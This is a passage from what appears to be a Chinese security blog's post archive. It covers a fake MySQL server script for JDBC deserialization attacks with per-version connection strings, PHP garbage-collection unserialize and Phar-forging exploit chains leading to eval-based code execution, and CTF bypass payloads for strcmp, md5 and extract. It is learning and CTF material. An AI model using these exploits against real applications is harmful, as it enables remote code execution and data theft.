&#123;&#125;:&#123;&#125;\".format(addr[0],addr[1]))\n\n        # 1.先发送第一个 问候报文\n        send_data(conn,greeting_data)\n\n        while True:\n            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok\n            receive_data(conn)\n            send_data(conn,response_ok_data)\n\n            #其他过程\n            data=receive_data(conn)\n            #查询一些配置信息,其中会发送自己的 版本号\n            if \"session.auto_increment_increment\" in data:\n                _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'\n                send_data(conn,_payload)\n                data=receive_data(conn)\n            elif \"show warnings\" in data:\n                _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'\n                send_data(conn, _payload)\n                data = receive_data(conn)\n            if \"set names\" in data:\n                send_data(conn, response_ok_data)\n                data = receive_data(conn)\n            if \"set character_set_results\" in data:\n                send_data(conn, response_ok_data)\n                data = receive_data(conn)\n            if \"show session status\" in data:\n                mysql_data = '0100000102'\n                mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'\n                mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'\n                # 为什么我加了EOF Packet 就无法正常运行呢？？\n                #获取payload\n                payload_content=get_payload_content()\n                #计算payload长度\n                payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)\n                payload_length_hex = payload_length[2:4] + payload_length[0:2]\n                #计算数据包长度\n                data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)\n                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]\n                mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex\n                mysql_data += str(payload_content)\n                mysql_data += '07000005fe000022000100'\n                send_data(conn, mysql_data)\n                data = receive_data(conn)\n            if \"show warnings\" in data:\n                payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'\n                send_data(conn, payload)\n            break\n\n\nif __name__ == '__main__':\n    HOST ='0.0.0.0'\n    PORT = 3309\n\n    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间\n    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sk.bind((HOST, PORT))\n    sk.listen(1)\n\n    print(\"start fake mysql server listening on &#123;&#125;:&#123;&#125;\".format(HOST,PORT))\n\n    run()\n\n在本地运行，并运行 JDBC 的连接代码\n\n\n再来看 Fake MySQL 服务端这边的响应，是能收到包，并且发包的；相当清晰\n\n\n调试分析\n在 com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues 下个断点，开始调试分析\n\n\n\n往下跟，先运行查询语句 SHOW SESSION STATUS，接着调用了 ResultSetUtil.resultSetToMap()\n\n\nResultSetUtil.resultSetToMap() 调用了 getObject() 方法，第一处调用 getObject() 方法回返回 null，第二次调用时才会走到反序列化的代码逻辑里面。\n\n\n在调用 getObject() 方法中，判断 MySQL 的类型为 BLOB 后，就从 MySQL 服务端中获取对应的字节码数据\n\n\n从 MySQL 服务端获取到字节码数据后，判断 autoDeserialize 是否为 true、字节码数据是否为序列化对象等，最后调用 readObject() 触发反序列化漏洞\n\n\n不同 MySQL-JDBC-Driver 的 payload8.x如上述 Demo：\n\"jdbc:mysql://127.0.0.1:3309/test?characterEncoding=UTF-8&amp;serverTimezone=Asia/Shanghai\" +  \n        \"&amp;autoDeserialize=true\" +  \n    \"&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\";\n\n6.x属性名不同，queryInterceptors 换为 statementInterceptors\njdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\n\n&gt;&#x3D;5.1.11包名中没有cj\njdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\n\n5.x &lt;&#x3D; 5.1.10同上，但需要连接后执行查询。\n5.1.29 - 5.1.40jdbc:mysql://x.x.x.x:3306/test?detectCustomCollations=true&amp;autoDeserialize=true\n\n5.1.28 - 5.1.19jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true\n\n0x04 小结总体来说还是比较简单的一条链子，但是需要注意到需要将 MySQL 字段类型修改为 BLOB 才可以。\n0x05 Referencehttps://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ehttps://xz.aliyun.com/t/8159\n","categories":["Java"],"tags":["Java"]},{"title":"PHP GC 回收机制学习","url":"/2022/11/13/PHP-GC-%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/","content":"PHP GC 回收机制学习\n\n\n0x01 前言知识分享所见所得，自己重新再复习一遍加深印象。因为 quan 爷已经整理了一遍，我跟着学即可知识分享内容地址：https://www.bilibili.com/video/BV16g411s7CH/\n0x02 PHP GC 回收机制是什么\n在 PHP 中，是拥有垃圾回收机制 Garbage collection 的，也就是我们常说的 GC 机制的，在 PHP 中使用引用计数和回收周期来自动管理内存对象的，当一个变量被设置为 NULL ，或者没有任何指针指向时，它就会被变成垃圾，被 GC 机制自动回收掉；那么当一个对象没有了任何引用之后，就会被回收，在回收过程中，就会自动调用对象中的 __destruct() 方法。\n\n\n上面这一段话我个人认为如果零基础看，会感觉到相当抽象。所以我们先来解读一下\n\nPHP 引用计数当我们 PHP 创建一个变量时，这个变量会被存储在一个名为 zval 的变量容器中。在这个 zval 变量容器中，不仅包含变量的类型和值，还包含两个字节的额外信息。\n第一个字节名为 is_ref，是 bool 值，它用来标识这个变量是否是属于引用集合。PHP 引擎通过这个字节来区分普通变量和引用变量，由于 PHP 允许用户使用 &amp; 来使用自定义引用，zval 变量容器中还有一个内部引用计数机制，来优化内存使用。\n第二个字节是 refcount，它用来表示指向 zval 变量容器的变量个数。所有的符号存储在一个符号表中，其中每个符号都有作用域。\n看接下来的这个例子\n&lt;?php\n$a = \"new string\"; \nxdebug_debug_zval('a'); //用于查看变量a的zval变量容器的内容\n?>\n\n我们可以看到这里定义了一个变量 $a，生成了类型为 String 和值为 new string 的变量容器，而对于两个额外的字节，is_ref 和 refcount，我们这里可以看到是不存在引用的，所以 is_ref 的值应该是 false，而 refcount 是表示变量个数的，那么这里就应该是1，接下来我们验证一下。\n\n\n接下来我们添加一个引用\n&lt;?php\n&lt;?php\n$a=\"new string\"; \n$b =&amp;$a;\nxdebug_debug_zval('a');\n?>\n\n按照之前的思路，每生成一个变量就有一个 zval 记录其类型和值以及两个额外字节，那我们这里的话 a 的 refcount 应该是 1，is_ref 应该是 true，接下来我们验证一下\n\n\n哎，结果不同于我们所想的，这是为什么呢？因为同一变量容器被变量 a 和变量 b 关联，当没必要时，php 不会去复制已生成的变量容器。所以这一个 zval 容器存储了 a 和 b 两个变量，就使得 refcount 的值为 2\n接下来说一下容器的销毁这个事。变量容器在 refcount 变成 0 时就被销毁。它这个值是如何减少的呢，当函数执行结束或者对变量调用了 unset() 函数，refcount 就会减 1。\n看个例子\n&lt;?php\n$a=\"new string\"; \n$b =&amp;$a;\n$c =&amp;$b;\nxdebug_debug_zval('a');\nunset($b,$c);\nxdebug_debug_zval('a');\n?>\n\n按照刚刚所说，那么这里的首次输出的 is_ref 应该是 true，refcount 为 3。第二次输出的 is_ref 值是什么呢，我们可以看到引用 $a 的变量 $b 和 $c 都被 unset 了，所以这里的 is_ref 应该是 false，也是因为 unset，这里的 refcount 应该从 3 变成了 1，接下来验证一下\n\n\n0x03 PHP GC 回收机制攻击面\n原理：当 is_ref 减少时，会触发 __destuct 魔术方法，由此产生的一些 trick 类型攻击\n\nPHP 反序列化中的 PHP GC 利用这里的思路是，通过某些手段触发 PHP GC，这些手段都是基于 is_ref 被修改时发起的攻击。\nunset 直接取消引用\n代码如下\n\n&lt;?php\nhighlight_file(__FILE__); \nerror_reporting(0); \nclass test&#123; \n    public $num; \n    public function __construct($num) &#123;\n        $this->num = $num; echo $this->num.\"__construct\".\"&lt;/br>\"; \n    &#125;\n    public function __destruct()&#123;\n        echo $this->num.\"__destruct()\".\"&lt;/br>\"; \n    &#125;\n    &#125;\n$a = new test(1); \nunset($a);\n$b = new test(2); \n$c = new test(3); \n\n可以看到通过 unset() 方法主动取消引用，可以直接调用 __destruct 魔术方法。\n\n\n反序列化当中取消引用可以通过 unset() 方法直接做引用的取消，但是一般这种情况都是不可控的，更合理的方式是修改在反序列化当中的值。\n这种利用方式是这样的：比如在一个 array 里面存在一个键值对，value 为某个类，当这个类为 NULL 的时候，会被认为是 is_ref 为 0，也就是 false。这就可以触发到 __destruct 方法\n\n照例还是结合代码讲，比如下面这一道题目，我需要去触发 __destruct 魔术方法\n\n&lt;?php\nshow_source(__FILE__);\n$flag = \"flag\";\nclass B &#123;\n  function __destruct() &#123;\n    global $flag;\n    echo $flag;\n  &#125;\n&#125;\n\n$a = unserialize($_GET['payload']);\n\nthrow new Exception('输入失败');\n\n?>\n\n如果按照正常的反序列化思路，是没有办法去触发 __destruct 的，这里就用到了我们的 PHP GC 机制，通过把 is_ref 修改为 false，让它触发 __destruct\nPoC:\n&lt;?php\nshow_source(__FILE__);\n\nclass B &#123;\n  function __destruct() &#123;\n    global $flag;\n    echo $flag;\n  &#125;\n&#125;\n$a=array(new B,0);\n\necho serialize($a);\n\n\n得到序列化文本如下\na:2:&#123;i:0;O:1:\"B\":0:&#123;&#125;i:1;i:0;&#125;\n对象类型:长度:&#123;类型:长度;类型:长度:类名:值类型:长度;类型:长度;&#125;\n数组:长度为2::&#123;int型:长度0;类:长度为1:类名为\"B\":值为0 int型:值为1：int型;值为0\n\n此处对于序列化的字符串，我们先解析看一看，a 当中放了对象 B，目前 B 是有 is_ref 的，is_ref 指向了 array，所以这里我们将 is_ref 修改为 false 即可。\n如下\na:2:&#123;i:0;O:1:\"B\":0:&#123;&#125;i:0;i:0;&#125;\n\n\n\n验证成功！\nGC 在 Phar 反序列化中的利用差不多的原理，phar 反序列化比直接的反序列化多了签名，所以需要后续用 010 来修改一些内容，直接看例子\n&lt;?php \nhighlight_file(__FILE__); \nclass Test&#123; \n    public $code; \n    public function __destruct()&#123; \n        eval($this -> code); \n        &#125; \n&#125;\n$filename = $_GET['filename']; \necho file_get_contents($filename); \nthrow new Error(\"Garbage collection\"); \n?>\n\n看到 file_get_contents 函数和类，就想到 Phar 反序列化，所以接下来尝试借助 file_get_contents 方法来进行反序列化(因为这里只是本地测试一下，所以不再设置文件上传那些，直接将生成的 Phar 文件放置本地进行利用了)。 \n构造 EXP 如下\n&lt;?php \nclass test&#123;\n    public $code= \"phpinfo();\";\n&#125;\n$a = new test();\n$c = array($a,0); \n$b = new Phar('1.phar',0);//后缀名必须为phar\n$b->startBuffering();//开始缓冲 Phar 写操作\n$b->setMetadata($c);//自定义的meta-data存入manifest\n$b->setStub(\"&lt;?php __HALT_COMPILER();?>\");//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测\n$b->addFromString(\"test.txt\",\"test\");//添加要压缩的文件\n$b->stopBuffering();//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘\n?>\n\n注：需要去检查一下 php.ini 中的 phar.readonly 选项，如果是 On，需要修改为 Off。否则会报错，无法生成 phar 文件\n\n在生成 .phar 文件之后，用 010 打开，将里面序列化的字符串进行手动修改\n\n\n\n可以发现i:1，按照我们之前的思路，我们这里将i:1修改成i:0就可以绕过抛出异常，但在Phar文件中，我们是不能任意修改数据的，否则就会因为签名错误而导致文件出错，不过签名是可以进行伪造的，所以我们先将1.phar中的i:1修改为i:0，接下来利用脚本使得签名正确。\nimport gzip\nfrom hashlib import sha1\nwith open('D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\html\\\\1.phar', 'rb') as file:\n    f = file.read() \ns = f[:-28] # 获取要签名的数据\nh = f[-8:] # 获取签名类型以及GBMB标识\nnewf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB)\nopen(\"2.phar\",\"wb\").write(newf)\n\n打开2.phar文件查看一下\n\n\n变成 i:0 且文件正常，接下来利用 phar 伪协议包含这个文件\n$filename&#x3D;phar:&#x2F;&#x2F;2.phar\n\n\n\n0x04 实战例题Demo这是队内的师傅分享的题目\n&lt;?php \nhighlight_file(__FILE__); \nerror_reporting(0); \nclass cg0&#123; \n    public $num; \n    public function __destruct()&#123; \n        echo $this->num.\"hello __destruct\"; \n        &#125; \n    &#125;\nclass cg1&#123; \n    public $string; \n    public function __toString() &#123; \n        echo \"hello __toString\"; \n        $this->string->flag(); \n        &#125; \n    &#125;\nclass cg2&#123; \n    public $cmd; \n    public function flag()&#123; \n        echo \"hello __flag()\"; \n        eval($this->cmd); \n    &#125; \n&#125;\n$a=unserialize($_GET['code']); \nthrow new Exception(\"Garbage collection\"); \n?>\n\n这道题的思路比较简单\n1、首先调用 __destrcut，然后通过 num 参数触发__tostring2、给string参数赋值，调用cg2的flag方法3、给cmd参数赋值，实现RCE\n但我们会发现这里首先要用到的就是__destruct，而代码末尾带有throw new Exception(&quot;Garbage collection&quot;);，即异常抛出，所以我们首先需要解决的就是如何绕过他，上文在讲GC中的PHP反序列化时,demo已经给出了方法，即先传值给数组，而后将第二个索引置空即可，因此我们这里按照平常思路，先构造出payload\n&lt;?php \nhighlight_file(__FILE__); \nerror_reporting(0); \nclass cg0&#123; \n    public $num;\n&#125; \nclass cg1&#123; \n    public $string; \n&#125;\nclass cg2&#123; \n    public $cmd; \n&#125;\n$a = new cg0();\n$a->num=new cg1();\n$a->num->string=new cg2();\n$a->num->string->cmd=\"phpinfo();\";\n$b=array($a,0);\necho serialize($b);\n\n得到\na:2:&#123;i:0;O:3:\"cg0\":1:&#123;s:3:\"num\";O:3:\"cg1\":1:&#123;s:6:\"string\";O:3:\"cg2\":1:&#123;s:3:\"cmd\";s:10:\"phpinfo();\";&#125;&#125;&#125;i:1;i:0;&#125;\n\n将i:1修改为i:0\na:2:&#123;i:0;O:3:\"cg0\":1:&#123;s:3:\"num\";O:3:\"cg1\":1:&#123;s:6:\"string\";O:3:\"cg2\":1:&#123;s:3:\"cmd\";s:10:\"phpinfo();\";&#125;&#125;&#125;i:0;i:0;&#125;\n\n\n\nCTFShow 卷王杯 easy unserialize源码如下\n&lt;?php\n/**\n * @Author: F10wers_13eiCheng\n * @Date:   2022-02-01 11:25:02\n * @Last Modified by:   F10wers_13eiCheng\n * @Last Modified time: 2022-02-07 15:08:18\n */\ninclude(\"./HappyYear.php\");\n\nclass one &#123;\n    public $object;\n\n    public function MeMeMe() &#123;\n        array_walk($this, function($fn, $prev)&#123;\n            if ($fn[0] === \"Happy_func\" &amp;&amp; $prev === \"year_parm\") &#123;\n                global $talk;\n                echo \"$talk\".\"&lt;/br>\";\n                global $flag;\n                echo $flag;\n            &#125;\n        &#125;);\n    &#125;\n\n    public function __destruct() &#123;\n        @$this->object->add();\n    &#125;\n\n    public function __toString() &#123;\n        return $this->object->string;\n    &#125;\n&#125;\n\nclass second &#123;\n    protected $filename;\n\n    protected function addMe() &#123;\n        return \"Wow you have sovled\".$this->filename;\n    &#125;\n\n    public function __call($func, $args) &#123;\n        call_user_func([$this, $func.\"Me\"], $args);\n    &#125;\n&#125;\n\nclass third &#123;\n    private $string;\n\n    public function __construct($string) &#123;\n        $this->string = $string;\n    &#125;\n\n    public function __get($name) &#123;\n        $var = $this->$name;\n        $var[$name]();\n    &#125;\n&#125;\n\nif (isset($_GET[\"ctfshow\"])) &#123;\n    $a=unserialize($_GET['ctfshow']);\n    throw new Exception(\"高一新生报道\");\n&#125; else &#123;\n    highlight_file(__FILE__);\n&#125;\n\n简单梳理一下思路，触发MeMeMe方法为最终目标，以_destruct为起点，绕过抛出异常的方式同之前即可接下来看一下它的大致流程首先触发_destruct，那这里的add()无疑是让我们触发_call魔法方法，因此接下来到_call这里，发现这里拼接了Me，那它肯定就指向了addMe()这个方法，接下来看到$this-&gt;filename，想到触发_toString魔术方法，接下来根进_toString方法，发现object-&gt;string，那么这个的话就是触发_get方法了，因此接着看get()魔术方法，这个时候就有一个问题，怎么通过$var[$name]();来进入one类的MeMeMe方法，我们这里可以控制$var的值，当给它传值为数组，内容为类和方法时，就可成功触发类中的方法，所以我们这里给$var赋值为[new one(),MeMeMe]即可，此时还有一个问题，就是这个MeMeMe中的function($fn, $prev)如何理解，接下来我们本地测试一下\n\n\n发现这个$fn是变量值，而$prev则是变量名，因此这里我们新增一个变量名为year_parm，且其值为Happy_func即可绕过if语句，接下来就可以去写Exp了\n&lt;?php\n/**\n * @Author: F10wers_13eiCheng\n * @Date:   2022-02-01 11:25:02\n * @Last Modified by:   F10wers_13eiCheng\n * @Last Modified time: 2022-02-07 15:08:18\n */\ninclude(\"./HappyYear.php\");\n\nclass one &#123;\n    public $year_parm=array(\"Happy_func\");\n    public $object;\n\n    public function MeMeMe() &#123;\n        array_walk($this, function($fn, $prev)&#123;\n            if ($fn[0] === \"Happy_func\" &amp;&amp; $prev === \"year_parm\") &#123;\n                global $talk;\n                echo \"$talk\".\"&lt;/br>\";\n                global $flag;\n                echo $flag;\n            &#125;\n        &#125;);\n    &#125;\n\n    public function __destruct() &#123;\n        @$this->object->add();\n    &#125;\n\n    public function __toString() &#123;\n        return $this->object->string;\n    &#125;\n&#125;\n\nclass second &#123;\n    public $filename;\n\n    protected function addMe() &#123;\n        return \"Wow you have sovled\".$this->filename;\n    &#125;\n\n    public function __call($func, $args) &#123;\n        call_user_func([$this, $func.\"Me\"], $args);\n    &#125;\n&#125;\n\nclass third &#123;\n    private $string;\n\n    public function __construct($string) &#123;\n        $this->string = $string;\n    &#125;\n\n    public function __get($name) &#123;\n        $var = $this->$name;\n        $var[$name]();\n    &#125;\n&#125;\n\n$a=new one();\n$a->object=new second();\n$a->object->filename=new one();\n$a->object->filename->object=new third(array(\"string\"=>[new one(),\"MeMeMe\"]));\n$b = array($a,NULL);\necho urlencode(serialize($b));\n\n得到payload\n\n0x05 小结实战很重要。\n","categories":["PHP"],"tags":["PHP"]},{"title":"PHP 入门基础漏洞","url":"/2022/08/17/PHP-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/","content":"PHP 入门基础漏洞\n\n\n0x01 前言这篇文章还是讲一讲黑魔法为主。基于 php_bugs 来学习吧，也听一些师傅说了，如果不是为了打 CTF，根本没必要学 PHP 了，今天是 2022-8-29；正好 Java 学不进去，过一遍 PHP\n0x02 PHP 基础函数与特性file_get_contentsfile_get_contents() 把整个文件读入一个字符串中。\n\n举个例子\n\n&lt;?php  \necho file_get_contents(\"test.txt\");  \n?>\n\n\n上面的代码将输出：\nThis is a test file with test text.\n\nissetisset() 函数用于检测变量是否已设置并且非 NULL。\n语法bool isset ( mixed $var [, mixed $... ] )\n参数说明：\n\n$var：要检测的变量。\n\n如果一次传入多个参数，那么 isset() 只有在全部参数都被设置时返回 TRUE，计算过程从左至右，中途遇到没有设置的变量时就会立即停止。\n\n举个栗子\n\n&lt;?php $var = ''; // 结果为 TRUE，所以后边的文本将被打印出来。 \n\nif (isset($var)) &#123; echo \"变量已设置。\" . PHP_EOL; &#125; \n\n// 在后边的例子中，我们将使用 var_dump 输出 isset() 的返回值。 \n// the return value of isset(). \n\n$a = \"test\"; $b = \"anothertest\"; var_dump(isset($a)); // TRUE \n\nvar_dump(isset($a, $b)); // TRUE \n\nunset ($a); var_dump(isset($a)); // FALSE \n\nvar_dump(isset($a, $b)); // FALSE \n\n\n$foo = NULL;\nvar_dump(isset($foo)); // FALSE ?>\n\n\n返回值如果指定变量存在且不为 NULL，则返回 TRUE，否则返回 FALSE。\nextractextract() 函数从数组中将变量导入到当前的符号表。\n语法extract(_array,extract_rules,prefix_)\n\ntrim移除字符串两侧的字符（”Hello” 中的 “He”以及 “World” 中的 “d!”）：\n&lt;?php $str = \"Hello World!\"; echo $str . PHP_EOL; echo trim($str,\"Hed!\"); ?>\n\nereg&#x2F;preg_match**mb_ereg**（字符串`$pattern`，字符串`$string`，数组 `&amp;$matches` = **`null`**）：bool\n\n执行与多字节支持的正则表达式匹配。\n返回值是 true 或者 false\nstrcmp用法\nstrcmp(str1, str2)\n\tif(str1 &lt; str2) &#123;\n\t\treturn &lt; 0;\n\t&#125;\n\n\telse if (str1 > str2) &#123;\n\t\treturn > 0;\n\t&#125;\n\n\telse &#123;\n\t\treturn 0;\n\t&#125;\n\n意思是，我们如果使用了 strcmp() 函数，就必须要传入两个变量 ———— str1，str2。\n如果 str1 &lt; str2，则返回 &lt; 0；若 str1 &gt; str2，则返回 &gt; 0；如果两者相等，返回 0。\n现在我们回来看上面这段源代码，很显然，如果这是一道题目，我们不可能知道 FLAG 是多少，所以无法做到让两者相等，这时候就有了我们很重要的绕过特性！\n\n当 strcmp() 比较出错的时候 —-&gt; 返回 NULL；而返回 NULL 即为返回 0，这时候我们就可以得到 Flag ~\n\n0x03 PHP 常见黑魔法\n如果要用一句话概括一下黑魔法的成因，我喜欢把它称之为 PHP 原生特点。\n\n在 PHP 当中，我们在类型比较的过程中会产生很多的奇特现象，正是由于这一些奇特现象，会产生一些成功的绕过手段。\n1. strcmp 的绕过\n这里我们先看这样的一段代码：\n\nStrcmp.php\n&lt;?php\n\t\ndefine('FLAG', 'DrunkCTF&#123;this_is_arrayCompare_flag&#125;');\nif (strcmp($_GET['flag'], FLAG) == 0) &#123;\n echo \"success, flag:\" . FLAG;\n&#125;\n\n?>\n\n此处 $_GET[&#39;flag&#39;] 的意思是从 url 中获取到一个名叫 flag 的 GET 参数。\n然后来看我们现在要讲的关键函数 strcmp()\n它的用法应该是这样的\nstrcmp(str1, str2)\n\tif(str1 &lt; str2) &#123;\n\t\treturn &lt; 0;\n\t&#125;\n\n\telse if (str1 > str2) &#123;\n\t\treturn > 0;\n\t&#125;\n\n\telse &#123;\n\t\treturn 0;\n\t&#125;\n\n意思是，我们如果使用了 strcmp() 函数，就必须要传入两个变量 ———— str1，str2。\n如果 str1 &lt; str2，则返回 &lt; 0；若 str1 &gt; str2，则返回 &gt; 0；如果两者相等，返回 0。\n现在我们回来看上面这段源代码，很显然，如果这是一道题目，我们不可能知道 FLAG 是多少，所以无法做到让两者相等，这时候就有了我们很重要的绕过特性！\n\n当 strcmp() 比较出错的时候 —-&gt; 返回 NULL；而返回 NULL 即为返回 0，这时候我们就可以得到 Flag ~\n\n绕过手段我们先讲 payload，再来讲原理；payload：\n?flag[]&#x3D;0\n\n成功，如图\n\n\n原理很简单；?flag[]=0 的意思也就是，我传入的变量名为 flag，但是这个 flag 是一个数组类型的变量，数组怎么可能可以和字符串比较呢？所以此处比较出错，成功返回 NULL，也就是返回 0\n2. md5 比较绕过题目代码如下：\n&lt;?php\n define('FLAG', 'DrunkCTF&#123;you_bypass_md5!&#125;');\n if (($_GET['s1']) != $_GET['s2'] &amp;&amp; md5($_GET['s1']) == $_GET['s2']) &#123;\n\t echo \"success, flag is :\" . FLAG;\n &#125;\n?>\n\n简单来说，我们的逻辑就是 s1 和 s2 不能相等，但是它们的 md5 值要相等；于是就有了如下两种绕过手段。\n绕过一用科学计数法绕过\n‘0e123456789’ &#x3D;&#x3D; ‘0e987654321’ &#x3D;&#x3D; 0\n以下值在md5加密后以0E开头：\n\nQNKCDZO\n240610708\ns878926199a\ns155964671a\ns214587387a\ns214587387a\n0e215962017（这个用的非常多\n\npayload 如下\nmd5.php?s1&#x3D;QNKCDZO&amp;s2&#x3D;240610708\n\n\n绕过二通过数组绕过，也叫数组 trick\n原理：\nmd5([1,2,3]) == md5([4,5,6]) == NULL\n\n所以我们的 payload：\nmd5.php?s1[]&#x3D;1&amp;s2[]&#x3D;2\n\n3. extract 变量覆盖绕过源码如下\n&lt;?php\n\t\n$flag='xxx';\nextract($_GET);\n if(isset($shiyan)) &#123;\n $content=trim(file_get_contents($flag));\n \tif($shiyan==$content) &#123;\n \t\techo'ctf&#123;xxx&#125;';\n \t&#125;\n \telse &#123;\n \t\techo'Oh.no';\n \t&#125;\n &#125;\n\n?>\n\n这里需要实现$shiyan==$content，$content来源于file_get_contents($flag)，而这个file_get_contents函数是把文件的信息打印出来，我们这个flag是个变量，他取值必定不是文件名，因此这里content变量的值为空，此时无论怎么写flag，content都为空，我们只需要保证shiyan也为空就可以，构造payload如下\nflag=123&amp;shiyan=\n\n4. 绕过过滤的空白字符源码如下\n&lt;?php\n show_source(__FILE__);\n$info = \"\"; \n$req = [];\n$flag=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\";\n \nini_set(\"display_error\", false); //为一个配置选项设置值\nerror_reporting(0); //关闭所有PHP错误报告\n \nif(!isset($_GET['number']))&#123;\n   header(\"hint:26966dc52e85af40f59b4fe73d8c323a.txt\"); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt\n \n   die(\"have a fun!!\"); //die — 等同于 exit()\n \n&#125;\n \nforeach([$_GET, $_POST] as $global_var) &#123;  //foreach 语法结构提供了遍历数组的简单方式 \n    foreach($global_var as $key => $value) &#123; \n        $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）\n        is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串\n    &#125; \n&#125; \n \n \nfunction is_palindrome_number($number) &#123; \n    $number = strval($number); //strval — 获取变量的字符串值\n    $i = 0; \n    $j = strlen($number) - 1; //strlen — 获取字符串长度\n    while($i &lt; $j) &#123; \n        if($number[$i] !== $number[$j]) &#123; \n            return false; \n        &#125; \n        $i++; \n        $j--; \n    &#125; \n    return true; \n&#125; \n \n \nif(is_numeric($_REQUEST['number'])) //is_numeric — 检测变量是否为数字或数字字符串 \n&#123;\n \n   $info=\"sorry, you cann't input a number!\";\n \n&#125;\nelseif($req['number']!=strval(intval($req['number']))) //intval — 获取变量的整数值\n&#123;\n \n     $info = \"number must be equal to it's integer!! \";  \n \n&#125;\nelse\n&#123;\n \n     $value1 = intval($req[\"number\"]);\n     $value2 = intval(strrev($req[\"number\"]));  \n \n     if($value1!=$value2)&#123;\n          $info=\"no, this is not a palindrome number!\";\n     &#125;\n     else\n     &#123;\n \n          if(is_palindrome_number($req[\"number\"]))&#123;\n              $info = \"nice! &#123;$value1&#125; is a palindrome number!\"; \n          &#125;\n          else\n          &#123;\n             $info=$flag;\n          &#125;\n     &#125;\n \n&#125;\n \necho $info;\n\n我们这里可以分段代码审计一下\n首先告诉我们需要传进去一个 GET 请求的参数，名为 number；\nif(!isset($_GET['number']))&#123;\n\n header(\"hint:26966dc52e85af40f59b4fe73d8c323a.txt\"); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt\n\n die(\"have a fun!!\"); //die — 等同于 exit()\n\n&#125;\n\n往下看 \nforeach([$_GET, $_POST] as $global_var) &#123; //foreach 语法结构提供了遍历数组的简单方式\n\n foreach($global_var as $key => $value) &#123;\n\n $value 